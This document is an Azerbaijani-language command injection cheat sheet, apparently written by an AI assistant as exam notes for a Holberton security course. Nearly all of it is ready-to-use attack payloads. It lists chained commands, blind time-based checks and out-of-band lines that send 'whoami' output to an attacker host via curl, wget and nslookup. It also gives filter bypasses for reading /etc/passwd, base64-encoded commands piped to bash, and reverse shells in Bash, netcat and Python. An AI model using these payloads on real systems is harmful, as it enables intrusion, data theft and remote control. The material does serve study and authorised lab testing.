Məqaləni tam ətraflı, dərinliyinə qədər və imtahanda qarşına çıxa biləcək bütün ssenariləri (Verbose, Blind, Time-based, OOB və Filter Bypass-lar) əhatə edəcək şəkildə hazırladım. Holberton imtahanlarında filtrləri keçmək (Bypass) xüsusilə kritik rol oynayır, ona görə də bu hissəni maksimum geniş saxladım.

Budur, GitHub-a birbaşa yerləşdirə biləcəyin **Komanda İnleksiyası (Command Injection) Magistr Qeydləri**:

---

```markdown
# 💻 Command Injection Eksploytasiya Qeydləri (Master Cheat Sheet)

Bu sənəd sistem əmrlərinin icrası (Command Injection) zəifliklərini praktiki olaraq aşkarlamaq, təhlükəsizlik divarlarını (WAF/Filters) yan keçmək və hədəf sistemdə Reverse Shell əldə etmək üçün tam bələdçidir.

---

## 📌 1. Əsas Komanda Birləşdiriciləri (Command Separators)

Proqramın daxil etdiyimiz məlumatı arxa fonda OS əmrinə necə ötürdüyünü anlamaq üçün ilk növbədə bu operatorlardan istifadə edərək əmrləri zəncirləyirik.

| Operator | Əməliyyat Sistemi | İzahı | Nümunə |
| :--- | :--- | :--- | :--- |
| `;` | Linux | Birinci əmrin uğurlu olub-olmamasından asılı olmayaraq ikincini icra edir. | `127.0.0.1; id` |
| `&` | Linux / Windows | Əmri arxa fonda (background) icra edir və dərhal növbəti əmrə keçir. | `127.0.0.1 & id` |
| `&&` | Linux / Windows | İkinci əmr yalnız birinci əmr **uğurla (Error 0)** başa çatdıqda icra olunur. | `127.0.0.1 && id` |
| `\|` | Linux / Windows | Birinci əmrin nəticəsini (output) ikinci əmrə giriş (input) kimi ötürür. | `127.0.0.1 \| id` |
| `\|\|` | Linux / Windows | İkinci əmr yalnız birinci əmr **uğursuz (Error)** olduqda icra olunur. | `Yalnis_Emr \|\| id` |
| `%0a` / `\n` | Linux (URL Encoded) | Yeni sətir (Newline) simvoludur. Sərt filtrləri keçmək üçün əladır. | `127.0.0.1%0aid` |

---

## 🔍 2. Verbose (Görünən) Command Injection

Əgər daxil etdiyiniz əmrin nəticəsi birbaşa veb səhifədə (məsələn, IP ping nəticəsi kimi) görünürsə, bu **Verbose**-dur.

### Sürətli Yoxlama Payload-ları:
* `127.0.0.1; id`
* `127.0.0.1 && whoami`
* `127.0.0.1 || uname -a`

---

## 🙈 3. Blind (Kor) Command Injection

Əgər əmriniz icra olunur, lakin səhifədə heç bir nəticə və ya xəta görünmürsə, bu **Blind** injectiondur. İki üsulla eksployt edilir:

### A. Zamana Əsaslanan (Time-based) Yoxlama
Sistemi müəyyən müddət gözləməyə məcbur edərək zəifliyin mövcudluğunu sübut edirik. Əgər səhifə gec yüklənirsə, zəiflik var.

```bash
# Linux üçün 5 saniyə gözləmə
127.0.0.1 ; sleep 5
127.0.0.1 && sleep 5

# Windows üçün 5 saniyə gözləmə (Ping vasitəsilə)
127.0.0.1 & ping -n 6 127.0.0.1

```

### B. Şəbəkə Vasitəsilə Məlumat Çıxarma (Out-of-Band - OOB)

Hədəf serverin bizim idarə etdiyimiz kənar serverə sorğu göndərməsini təmin edirik. (İmtahanda Burp Collaborator, Interactsh və ya öz lokal imtahan maşınınızın IP-sindən istifadə edin).

```bash
# HTTP vasitəsilə məlumat sızdırma
127.0.0.1 ; curl http://<SENIN_IP>:<PORT>/`whoami`
127.0.0.1 ; wget http://<SENIN_IP>:<PORT>/?data=$(whoami)

# DNS vasitəsilə məlumat sızdırma (Filtrləri keçmək üçün ən yaxşısıdır)
127.0.0.1 ; nslookup $(whoami).senin_collaborator_domaini.com

```

---

## 🛡️ 4. Filtrlərdən və WAF-dan Yan Keçmə (Bypass Techniques)

Holberton tapşırıqlarında çox vaxt boşluq buraxmaq (` `) və ya müəyyən sözlər (`cat`, `id`, `etc`) bloklanır. Bu üsullarla onları sındırırıq:

### A. Boşluq (Space) Filtrlərini Keçmək

Proqram boşluq simvolunu silirsə və ya bloklayırsa, bu alternativlərdən istifadə et:

* **Bash Daxili Dəyişəni (`$IFS`):** `Internal Field Separator` deməkdir və standart olaraq boşluq rolunu oynayır.
```bash
cat$IFS/etc/passwd
cat${IFS}/etc/passwd

```


* **Giriş Yönləndirmə (`<` simvolu):**
```bash
cat</etc/passwd

```


* **URL Kodlaşdırma:** `+` və ya `%20` (Bəzən faydalı olur).

### B. Qara Siyahıya Salınmış (Blacklisted) Sözləri Keçmək

Əgər sistem `cat`, `flag`, `id`, `passwd` kimi sözləri bloklayırsa:

* **Dırnaq işarələrinin köməyi ilə:**
```bash
c""at /et""c/pass""wd
c''at /et''c/pass''wd

```


* **Tərs Slash (`\`) vasitəsilə:**
```bash
c\at /e\tc/p\asswd

```


* **Vildkartlar (Wildcards - `?` və `*`) vasitəsilə:**
```bash
/bin/c?t /etc/p*sswd
/usr/bin/id

```


* **Dəyişənlərin Birləşdirilməsi:**
```bash
A=c; B=at; $A$B /etc/passwd

```



### C. Base64 Kodlaşdırma ilə Tam Yan Keçmə

Əgər filtrlər çox sərtdirsə, bütün komandanı Base64-ə çevirib göndər. Bu zaman filtr daxildəki əmrləri oxuya bilmir.

```bash
# Göndərmək istədiyimiz əmr: cat /etc/passwd
# Lokal maşınımızda kodlaşdırırıq: echo "cat /etc/passwd" | base64
# Alınan nəticə: Y2F0IC9ldGMvcGFzc3dkCg==

# Hücum Payload-u:
echo${IFS}Y2F0IC9ldGMvcGFzc3dkCg==|base64${IFS}-d|bash

```

---

## 🎯 5. Sürətli Reverse Shell Payloads

Komanda icrasını tək bir əmrlə tam terminal bağlantısına (Reverse Shell) çevirmək üçün istifadə olunan payload-lar.
*(Hücuma başlamazdan əvvəl öz maşınında `nc -lvnp 4444` komandası ilə portu dinləməyə al!)*

### Bash:

```bash
bash -i >& /dev/tcp/<SENIN_IP>/4444 0>&1

```

### Netcat (nc) alternativləri:

```bash
# Əgər nc -e parametri dəstəklənirsə
nc -e /bin/bash <SENIN_IP> 4444

# Əgər -e parametri bloklanıbsa (MKFIFO metodu)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SENIN_IP> 4444 >/tmp/f

```

### Python:

```bash
python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<SENIN_IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'

```

---

## 🤖 6. Avtomatlaşdırılmış Fuzzing və Alətlər

### Commix (Mütləq Yoxla)

Command Injection üzrə ixtisaslaşmış ən güclü avtomatlaşdırma alətidir. SQLMap kimidir, lakin OS komandaları üçün.

```bash
# Sadə GET sorğusu üçün fuzzing
commix --url="[http://target.com/ping.php?ip=INJECT_HERE](http://target.com/ping.php?ip=INJECT_HERE)"

# Burp-dən tutulmuş sorğu faylı ilə (Ən praktik və effektiv üsul)
commix --request=sorqu.txt --batch

```

```

